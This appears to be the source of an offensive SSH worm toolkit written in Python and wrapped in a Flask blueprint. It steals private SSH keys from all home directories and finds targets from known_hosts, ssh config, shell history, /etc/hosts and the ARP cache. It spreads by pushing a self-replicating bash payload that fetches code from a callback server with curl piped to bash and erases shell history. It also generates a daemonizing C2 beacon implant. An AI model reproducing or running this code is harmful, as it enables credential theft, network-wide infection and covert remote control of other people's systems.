#!/usr/bin/env python3
"""
SSH Worm & Key Harvester
Linux sunuculara girdikten sonra SSH anahtarlarını toplar ve ağdaki diğer sunuculara yayılır.

Author: Ghost
Date: February 2026
"""

import os
import sys
import re
import socket
import hashlib
import base64
import subprocess
import threading
import queue
import json
import time
from enum import Enum
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple, Any
from datetime import datetime
from pathlib import Path
import random
import string
import ipaddress


class PropagationStatus(Enum):
    """Propagation status"""
    PENDING = "pending"
    SCANNING = "scanning"
    KEY_FOUND = "key_found"
    CONNECTING = "connecting"
    SUCCESS = "success"
    FAILED = "failed"
    TIMEOUT = "timeout"


class KeyType(Enum):
    """SSH key types"""
    RSA = "rsa"
    DSA = "dsa"
    ECDSA = "ecdsa"
    ED25519 = "ed25519"
    UNKNOWN = "unknown"


@dataclass
class SSHKey:
    """Harvested SSH key"""
    key_type: KeyType
    public_key: str
    private_key: str
    passphrase: Optional[str]
    fingerprint: str
    path: str
    owner: str
    permissions: str
    harvested_at: datetime = field(default_factory=datetime.now)
    usable: bool = True


@dataclass
class KnownHost:
    """Entry from known_hosts"""
    hostname: str
    ip_address: Optional[str]
    port: int
    key_type: str
    public_key: str
    hashed: bool = False


@dataclass
class TargetHost:
    """Target for propagation"""
    hostname: str
    ip: str
    port: int = 22
    username: str = "root"
    status: PropagationStatus = PropagationStatus.PENDING
    last_attempt: Optional[datetime] = None
    successful_key: Optional[str] = None
    error_message: Optional[str] = None


@dataclass
class PropagationResult:
    """Result of propagation attempt"""
    target: TargetHost
    success: bool
    method: str  # key_auth, password, etc.
    shell_obtained: bool
    payload_deployed: bool
    timestamp: datetime = field(default_factory=datetime.now)


class SSHWorm:
    """
    SSH Worm with Key Harvesting and Auto-Propagation
    
    Features:
    - Harvest SSH keys from ~/.ssh/
    - Parse known_hosts for targets
    - Parse SSH config for additional targets
    - Auto-propagate to discovered hosts
    - Self-replicating payload
    - Stealth mode with minimal footprint
    """
    
    def __init__(self):
        self.harvested_keys: List[SSHKey] = []
        self.known_hosts: List[KnownHost] = []
        self.targets: List[TargetHost] = []
        self.successful_infections: List[PropagationResult] = []
        self.failed_attempts: List[PropagationResult] = []
        self.scan_queue = queue.Queue()
        self.propagation_threads = 5
        self.timeout = 10
        self.stealth_mode = True
        self.self_destruct = False
        
    def harvest_ssh_keys(self, home_dirs: Optional[List[str]] = None) -> List[SSHKey]:
        """
        Harvest SSH keys from user home directories
        """
        if home_dirs is None:
            home_dirs = self._get_home_directories()
        
        keys = []
        key_patterns = [
            "id_rsa",
            "id_dsa", 
            "id_ecdsa",
            "id_ed25519",
            "identity",
            "*.pem",
            "*.key"
        ]
        
        for home in home_dirs:
            ssh_dir = os.path.join(home, ".ssh")
            if not os.path.isdir(ssh_dir):
                continue
            
            for pattern in key_patterns:
                if "*" in pattern:
                    # Glob pattern
                    for f in Path(ssh_dir).glob(pattern):
                        key = self._parse_key_file(str(f))
                        if key:
                            keys.append(key)
                else:
                    key_path = os.path.join(ssh_dir, pattern)
                    if os.path.isfile(key_path):
                        key = self._parse_key_file(key_path)
                        if key:
                            keys.append(key)
            
            # Also check for authorized_keys (useful for pivoting)
            auth_keys_path = os.path.join(ssh_dir, "authorized_keys")
            if os.path.isfile(auth_keys_path):
                self._parse_authorized_keys(auth_keys_path)
        
        self.harvested_keys.extend(keys)
        return keys
    
    def _get_home_directories(self) -> List[str]:
        """Get all home directories on the system"""
        homes = []
        
        # Root home
        if os.path.isdir("/root"):
            homes.append("/root")
        
        # Regular users from /home
        if os.path.isdir("/home"):
            for user in os.listdir("/home"):
                user_home = os.path.join("/home", user)
                if os.path.isdir(user_home):
                    homes.append(user_home)
        
        # Parse /etc/passwd for other home directories
        try:
            with open("/etc/passwd", "r") as f:
                for line in f:
                    parts = line.strip().split(":")
                    if len(parts) >= 6:
                        home = parts[5]
                        if os.path.isdir(home) and home not in homes:
                            homes.append(home)
        except:
            pass
        
        return homes
    
    def _parse_key_file(self, path: str) -> Optional[SSHKey]:
        """Parse SSH private key file"""
        try:
            with open(path, "r") as f:
                content = f.read()
            
            # Check if it's a private key
            if "PRIVATE KEY" not in content:
                return None
            
            # Determine key type
            key_type = KeyType.UNKNOWN
            if "RSA PRIVATE KEY" in content:
                key_type = KeyType.RSA
            elif "DSA PRIVATE KEY" in content:
                key_type = KeyType.DSA
            elif "EC PRIVATE KEY" in content:
                key_type = KeyType.ECDSA
            elif "OPENSSH PRIVATE KEY" in content:
                # Could be ed25519 or other
                key_type = KeyType.ED25519
            
            # Check if encrypted
            encrypted = "ENCRYPTED" in content or "Proc-Type: 4,ENCRYPTED" in content
            
            # Get file info
            stat = os.stat(path)
            owner = self._get_file_owner(path)
            permissions = oct(stat.st_mode)[-3:]
            
            # Calculate fingerprint
            fingerprint = hashlib.sha256(content.encode()).hexdigest()[:32]
            
            # Try to find matching public key
            public_key = ""
            pub_path = path + ".pub"
            if os.path.isfile(pub_path):
                with open(pub_path, "r") as f:
                    public_key = f.read().strip()
            
            return SSHKey(
                key_type=key_type,
                public_key=public_key,
                private_key=content,
                passphrase=None if not encrypted else "ENCRYPTED",
                fingerprint=fingerprint,
                path=path,
                owner=owner,
                permissions=permissions,
                usable=not encrypted
            )
            
        except Exception as e:
            return None
    
    def _get_file_owner(self, path: str) -> str:
        """Get file owner username"""
        try:
            import pwd
            stat = os.stat(path)
            return pwd.getpwuid(stat.st_uid).pw_name
        except:
            return "unknown"
    
    def _parse_authorized_keys(self, path: str) -> List[str]:
        """Parse authorized_keys file"""
        keys = []
        try:
            with open(path, "r") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        keys.append(line)
        except:
            pass
        return keys
    
    def parse_known_hosts(self, home_dirs: Optional[List[str]] = None) -> List[KnownHost]:
        """
        Parse known_hosts files for target discovery
        """
        if home_dirs is None:
            home_dirs = self._get_home_directories()
        
        hosts = []
        
        for home in home_dirs:
            known_hosts_path = os.path.join(home, ".ssh", "known_hosts")
            if not os.path.isfile(known_hosts_path):
                continue
            
            try:
                with open(known_hosts_path, "r") as f:
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith("#"):
                            continue
                        
                        host = self._parse_known_hosts_line(line)
                        if host:
                            hosts.append(host)
            except:
                continue
        
        self.known_hosts.extend(hosts)
        return hosts
    
    def _parse_known_hosts_line(self, line: str) -> Optional[KnownHost]:
        """Parse a single known_hosts line"""
        try:
            parts = line.split()
            if len(parts) < 3:
                return None
            
            host_part = parts[0]
            key_type = parts[1]
            public_key = parts[2]
            
            # Check if hashed
            hashed = host_part.startswith("|1|")
            
            hostname = ""
            ip_address = None
            port = 22
            
            if not hashed:
                # Parse hostname/IP
                if "," in host_part:
                    # Multiple entries
                    entries = host_part.split(",")
                    for entry in entries:
                        if entry.startswith("["):
                            # [hostname]:port format
                            match = re.match(r'\[([^\]]+)\]:(\d+)', entry)
                            if match:
                                hostname = match.group(1)
                                port = int(match.group(2))
                        else:
                            # Try to determine if IP or hostname
                            try:
                                ipaddress.ip_address(entry)
                                ip_address = entry
                            except:
                                hostname = entry
                else:
                    if host_part.startswith("["):
                        match = re.match(r'\[([^\]]+)\]:(\d+)', host_part)
                        if match:
                            hostname = match.group(1)
                            port = int(match.group(2))
                    else:
                        try:
                            ipaddress.ip_address(host_part)
                            ip_address = host_part
                        except:
                            hostname = host_part
            
            return KnownHost(
                hostname=hostname,
                ip_address=ip_address,
                port=port,
                key_type=key_type,
                public_key=public_key,
                hashed=hashed
            )
            
        except:
            return None
    
    def parse_ssh_config(self, home_dirs: Optional[List[str]] = None) -> List[Dict]:
        """
        Parse SSH config files for additional targets
        """
        if home_dirs is None:
            home_dirs = self._get_home_directories()
        
        configs = []
        
        # System-wide config
        if os.path.isfile("/etc/ssh/ssh_config"):
            configs.extend(self._parse_ssh_config_file("/etc/ssh/ssh_config"))
        
        # User configs
        for home in home_dirs:
            config_path = os.path.join(home, ".ssh", "config")
            if os.path.isfile(config_path):
                configs.extend(self._parse_ssh_config_file(config_path))
        
        return configs
    
    def _parse_ssh_config_file(self, path: str) -> List[Dict]:
        """Parse SSH config file"""
        hosts = []
        current_host = None
        
        try:
            with open(path, "r") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    
                    parts = line.split(None, 1)
                    if len(parts) < 2:
                        continue
                    
                    key, value = parts[0].lower(), parts[1]
                    
                    if key == "host":
                        if current_host and current_host.get("hostname"):
                            hosts.append(current_host)
                        current_host = {"alias": value}
                    elif current_host:
                        if key == "hostname":
                            current_host["hostname"] = value
                        elif key == "port":
                            current_host["port"] = int(value)
                        elif key == "user":
                            current_host["user"] = value
                        elif key == "identityfile":
                            current_host["identity_file"] = value
                
                if current_host and current_host.get("hostname"):
                    hosts.append(current_host)
                    
        except:
            pass
        
        return hosts
    
    def parse_bash_history(self, home_dirs: Optional[List[str]] = None) -> List[TargetHost]:
        """
        Parse bash history for SSH connection attempts
        """
        if home_dirs is None:
            home_dirs = self._get_home_directories()
        
        targets = []
        ssh_pattern = re.compile(r'ssh\s+(?:-[a-zA-Z]\s+\S+\s+)*(?:(\w+)@)?(\S+)(?:\s+-p\s+(\d+))?')
        scp_pattern = re.compile(r'scp\s+.*?(?:(\w+)@)?(\S+):')
        
        for home in home_dirs:
            for history_file in [".bash_history", ".zsh_history", ".history"]:
                history_path = os.path.join(home, history_file)
                if not os.path.isfile(history_path):
                    continue
                
                try:
                    with open(history_path, "r", errors='ignore') as f:
                        for line in f:
                            # Parse SSH commands
                            match = ssh_pattern.search(line)
                            if match:
                                user = match.group(1) or "root"
                                host = match.group(2)
                                port = int(match.group(3)) if match.group(3) else 22
                                
                                # Resolve hostname to IP
                                ip = self._resolve_hostname(host)
                                if ip:
                                    target = TargetHost(
                                        hostname=host,
                                        ip=ip,
                                        port=port,
                                        username=user
                                    )
                                    if target not in targets:
                                        targets.append(target)
                            
                            # Parse SCP commands
                            match = scp_pattern.search(line)
                            if match:
                                user = match.group(1) or "root"
                                host = match.group(2)
                                ip = self._resolve_hostname(host)
                                if ip:
                                    target = TargetHost(
                                        hostname=host,
                                        ip=ip,
                                        username=user
                                    )
                                    if target not in targets:
                                        targets.append(target)
                except:
                    continue
        
        return targets
    
    def _resolve_hostname(self, hostname: str) -> Optional[str]:
        """Resolve hostname to IP address"""
        try:
            # Check if already an IP
            ipaddress.ip_address(hostname)
            return hostname
        except:
            pass
        
        try:
            return socket.gethostbyname(hostname)
        except:
            return None
    
    def discover_targets(self) -> List[TargetHost]:
        """
        Comprehensive target discovery
        """
        targets = []
        seen_ips = set()
        
        # From known_hosts
        for host in self.known_hosts:
            ip = host.ip_address or self._resolve_hostname(host.hostname)
            if ip and ip not in seen_ips:
                seen_ips.add(ip)
                targets.append(TargetHost(
                    hostname=host.hostname or ip,
                    ip=ip,
                    port=host.port
                ))
        
        # From SSH config
        ssh_configs = self.parse_ssh_config()
        for config in ssh_configs:
            hostname = config.get("hostname", "")
            ip = self._resolve_hostname(hostname)
            if ip and ip not in seen_ips:
                seen_ips.add(ip)
                targets.append(TargetHost(
                    hostname=config.get("alias", hostname),
                    ip=ip,
                    port=config.get("port", 22),
                    username=config.get("user", "root")
                ))
        
        # From bash history
        history_targets = self.parse_bash_history()
        for target in history_targets:
            if target.ip not in seen_ips:
                seen_ips.add(target.ip)
                targets.append(target)
        
        # From /etc/hosts
        hosts_targets = self._parse_etc_hosts()
        for hostname, ip in hosts_targets:
            if ip not in seen_ips:
                seen_ips.add(ip)
                targets.append(TargetHost(
                    hostname=hostname,
                    ip=ip
                ))
        
        # From ARP cache
        arp_targets = self._parse_arp_cache()
        for ip in arp_targets:
            if ip not in seen_ips:
                seen_ips.add(ip)
                targets.append(TargetHost(
                    hostname=ip,
                    ip=ip
                ))
        
        self.targets = targets
        return targets
    
    def _parse_etc_hosts(self) -> List[Tuple[str, str]]:
        """Parse /etc/hosts for targets"""
        hosts = []
        try:
            with open("/etc/hosts", "r") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    
                    parts = line.split()
                    if len(parts) >= 2:
                        ip = parts[0]
                        hostname = parts[1]
                        
                        # Skip localhost
                        if ip.startswith("127.") or ip == "::1":
                            continue
                        
                        hosts.append((hostname, ip))
        except:
            pass
        return hosts
    
    def _parse_arp_cache(self) -> List[str]:
        """Parse ARP cache for local network hosts"""
        ips = []
        try:
            # Linux ARP cache
            if os.path.isfile("/proc/net/arp"):
                with open("/proc/net/arp", "r") as f:
                    next(f)  # Skip header
                    for line in f:
                        parts = line.split()
                        if len(parts) >= 1:
                            ip = parts[0]
                            if ip != "0.0.0.0":
                                ips.append(ip)
        except:
            pass
        return ips
    
    def generate_propagation_payload(self) -> str:
        """
        Generate self-replicating payload
        """
        
        payload = '''#!/bin/bash
# SSH Worm Propagation Payload
# Minimal footprint, self-replicating

set -e

INSTALL_DIR="/tmp/.$(cat /dev/urandom | tr -dc 'a-z' | fold -w 8 | head -n 1)"
MARKER="/tmp/.ssh_worm_marker"

# Check if already infected
if [ -f "$MARKER" ]; then
    exit 0
fi

# Create marker
touch "$MARKER"
chmod 000 "$MARKER"

# Create installation directory
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# Download/create main payload
cat > worm.py << 'WORM_EOF'
import os
import sys
import subprocess
import socket
import re
from pathlib import Path

class MiniWorm:
    def __init__(self):
        self.keys = []
        self.targets = []
    
    def harvest_keys(self):
        homes = ["/root"] + [f"/home/{u}" for u in os.listdir("/home") if os.path.isdir(f"/home/{u}")]
        for home in homes:
            ssh_dir = os.path.join(home, ".ssh")
            if os.path.isdir(ssh_dir):
                for f in os.listdir(ssh_dir):
                    if f.startswith("id_") and not f.endswith(".pub"):
                        key_path = os.path.join(ssh_dir, f)
                        try:
                            with open(key_path, "r") as kf:
                                content = kf.read()
                                if "PRIVATE KEY" in content and "ENCRYPTED" not in content:
                                    self.keys.append(key_path)
                        except:
                            pass
    
    def find_targets(self):
        seen = set()
        homes = ["/root"] + [f"/home/{u}" for u in os.listdir("/home") if os.path.isdir(f"/home/{u}")]
        
        for home in homes:
            known_hosts = os.path.join(home, ".ssh", "known_hosts")
            if os.path.isfile(known_hosts):
                with open(known_hosts, "r") as f:
                    for line in f:
                        parts = line.strip().split()
                        if len(parts) >= 3:
                            host = parts[0].split(",")[0].strip("[]").split(":")[0]
                            if not host.startswith("|"):
                                try:
                                    ip = socket.gethostbyname(host)
                                    if ip not in seen:
                                        seen.add(ip)
                                        self.targets.append((host, ip))
                                except:
                                    pass
    
    def propagate(self, target_ip, key_path):
        try:
            # Test connection
            cmd = f"ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5 -i {key_path} root@{target_ip} 'echo ok' 2>/dev/null"
            result = subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
            
            if result.returncode == 0:
                # Copy payload
                payload_cmd = f"ssh -o BatchMode=yes -o StrictHostKeyChecking=no -i {key_path} root@{target_ip} 'curl -s http://CALLBACK_SERVER/p.sh | bash' 2>/dev/null"
                subprocess.run(payload_cmd, shell=True, timeout=30)
                return True
        except:
            pass
        return False
    
    def run(self):
        self.harvest_keys()
        self.find_targets()
        
        for host, ip in self.targets:
            for key in self.keys:
                if self.propagate(ip, key):
                    print(f"[+] Infected: {ip}")
                    break

if __name__ == "__main__":
    worm = MiniWorm()
    worm.run()
WORM_EOF

# Run the worm
python3 worm.py &

# Cleanup traces
history -c 2>/dev/null || true
unset HISTFILE

# Self-destruct option
if [ "$1" == "--cleanup" ]; then
    rm -rf "$INSTALL_DIR"
    rm -f "$MARKER"
fi
'''
        
        return payload
    
    def generate_stealthy_implant(self) -> str:
        """
        Generate stealthy SSH-based implant
        """
        
        implant = '''#!/usr/bin/env python3
"""
SSH Worm Implant - Stealth Edition
"""

import os
import sys
import time
import socket
import subprocess
import threading
import base64
import hashlib
from datetime import datetime

class SSHImplant:
    def __init__(self):
        self.beacon_interval = 300  # 5 minutes
        self.c2_host = "CALLBACK_SERVER"
        self.c2_port = 443
        self.id = hashlib.md5(socket.gethostname().encode()).hexdigest()[:8]
        
    def beacon(self):
        """Send beacon to C2"""
        info = {
            "id": self.id,
            "hostname": socket.gethostname(),
            "user": os.getenv("USER", "unknown"),
            "ip": self._get_ip(),
            "timestamp": datetime.now().isoformat()
        }
        # Encode and send via DNS TXT or HTTPS
        
    def _get_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "unknown"
    
    def execute_command(self, cmd):
        """Execute command and return output"""
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, timeout=60)
            return result.stdout.decode() + result.stderr.decode()
        except:
            return "Error"
    
    def run(self):
        """Main loop"""
        while True:
            try:
                self.beacon()
                # Check for commands
                # Execute and report
            except:
                pass
            time.sleep(self.beacon_interval)

if __name__ == "__main__":
    implant = SSHImplant()
    # Daemonize
    if os.fork() > 0:
        sys.exit(0)
    os.setsid()
    if os.fork() > 0:
        sys.exit(0)
    
    implant.run()
'''
        
        return implant
    
    def try_propagate(self, target: TargetHost, key: SSHKey) -> PropagationResult:
        """
        Attempt to propagate to target using harvested key
        """
        target.status = PropagationStatus.CONNECTING
        target.last_attempt = datetime.now()
        
        # Build SSH command
        ssh_cmd = [
            "ssh",
            "-o", "BatchMode=yes",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", f"ConnectTimeout={self.timeout}",
            "-p", str(target.port),
            "-i", key.path,
            f"{target.username}@{target.ip}",
            "echo 'WORM_TEST_OK'"
        ]
        
        try:
            result = subprocess.run(
                ssh_cmd,
                capture_output=True,
                timeout=self.timeout + 5
            )
            
            if result.returncode == 0 and b"WORM_TEST_OK" in result.stdout:
                target.status = PropagationStatus.SUCCESS
                target.successful_key = key.fingerprint
                
                # Deploy payload
                payload = self.generate_propagation_payload()
                deploy_cmd = ssh_cmd[:-1] + [f"echo '{base64.b64encode(payload.encode()).decode()}' | base64 -d | bash"]
                
                subprocess.run(deploy_cmd, capture_output=True, timeout=30)
                
                return PropagationResult(
                    target=target,
                    success=True,
                    method="key_auth",
                    shell_obtained=True,
                    payload_deployed=True
                )
            else:
                target.status = PropagationStatus.FAILED
                target.error_message = result.stderr.decode()[:100]
                
        except subprocess.TimeoutExpired:
            target.status = PropagationStatus.TIMEOUT
            target.error_message = "Connection timeout"
        except Exception as e:
            target.status = PropagationStatus.FAILED
            target.error_message = str(e)[:100]
        
        return PropagationResult(
            target=target,
            success=False,
            method="key_auth",
            shell_obtained=False,
            payload_deployed=False
        )
    
    def propagate_all(self, max_threads: int = 5) -> List[PropagationResult]:
        """
        Propagate to all discovered targets
        """
        results = []
        
        def worker(target: TargetHost):
            for key in self.harvested_keys:
                if not key.usable:
                    continue
                
                result = self.try_propagate(target, key)
                if result.success:
                    self.successful_infections.append(result)
                    return result
                else:
                    self.failed_attempts.append(result)
            
            return None
        
        threads = []
        for target in self.targets:
            if len(threads) >= max_threads:
                # Wait for a thread to complete
                for t in threads:
                    t.join(timeout=1)
                threads = [t for t in threads if t.is_alive()]
            
            t = threading.Thread(target=worker, args=(target,))
            t.start()
            threads.append(t)
        
        # Wait for all threads
        for t in threads:
            t.join()
        
        return self.successful_infections
    
    def get_status(self) -> Dict[str, Any]:
        """Get worm status"""
        return {
            "harvested_keys": len(self.harvested_keys),
            "usable_keys": len([k for k in self.harvested_keys if k.usable]),
            "known_hosts": len(self.known_hosts),
            "discovered_targets": len(self.targets),
            "successful_infections": len(self.successful_infections),
            "failed_attempts": len(self.failed_attempts),
            "keys": [
                {
                    "type": k.key_type.value,
                    "fingerprint": k.fingerprint,
                    "path": k.path,
                    "owner": k.owner,
                    "usable": k.usable
                } for k in self.harvested_keys
            ],
            "targets": [
                {
                    "hostname": t.hostname,
                    "ip": t.ip,
                    "port": t.port,
                    "status": t.status.value
                } for t in self.targets
            ]
        }


# Flask Blueprint
from flask import Blueprint, render_template, request, jsonify

ssh_worm_bp = Blueprint('ssh_worm', __name__, url_prefix='/ssh-worm')

_worm = SSHWorm()

@ssh_worm_bp.route('/')
def index():
    return render_template('ssh_worm.html')

@ssh_worm_bp.route('/api/status')
def api_status():
    return jsonify({
        "success": True,
        "status": _worm.get_status()
    })

@ssh_worm_bp.route('/api/harvest-keys', methods=['POST'])
def api_harvest():
    keys = _worm.harvest_ssh_keys()
    return jsonify({
        "success": True,
        "harvested": len(keys),
        "keys": [
            {
                "type": k.key_type.value,
                "fingerprint": k.fingerprint,
                "path": k.path,
                "usable": k.usable
            } for k in keys
        ]
    })

@ssh_worm_bp.route('/api/parse-known-hosts', methods=['POST'])
def api_known_hosts():
    hosts = _worm.parse_known_hosts()
    return jsonify({
        "success": True,
        "found": len(hosts),
        "hosts": [
            {
                "hostname": h.hostname,
                "ip": h.ip_address,
                "port": h.port,
                "hashed": h.hashed
            } for h in hosts
        ]
    })

@ssh_worm_bp.route('/api/discover-targets', methods=['POST'])
def api_discover():
    targets = _worm.discover_targets()
    return jsonify({
        "success": True,
        "discovered": len(targets),
        "targets": [
            {
                "hostname": t.hostname,
                "ip": t.ip,
                "port": t.port,
                "username": t.username,
                "status": t.status.value
            } for t in targets
        ]
    })

@ssh_worm_bp.route('/api/propagate', methods=['POST'])
def api_propagate():
    data = request.get_json() or {}
    max_threads = data.get('threads', 5)
    
    # First ensure we have keys and targets
    if not _worm.harvested_keys:
        _worm.harvest_ssh_keys()
    if not _worm.targets:
        _worm.discover_targets()
    
    results = _worm.propagate_all(max_threads)
    
    return jsonify({
        "success": True,
        "infections": len(results),
        "results": [
            {
                "target": r.target.ip,
                "success": r.success,
                "method": r.method
            } for r in results
        ]
    })

@ssh_worm_bp.route('/api/generate-payload')
def api_payload():
    payload = _worm.generate_propagation_payload()
    return jsonify({
        "success": True,
        "payload": payload,
        "size": len(payload)
    })

@ssh_worm_bp.route('/api/generate-implant')
def api_implant():
    implant = _worm.generate_stealthy_implant()
    return jsonify({
        "success": True,
        "implant": implant,
        "size": len(implant)
    })
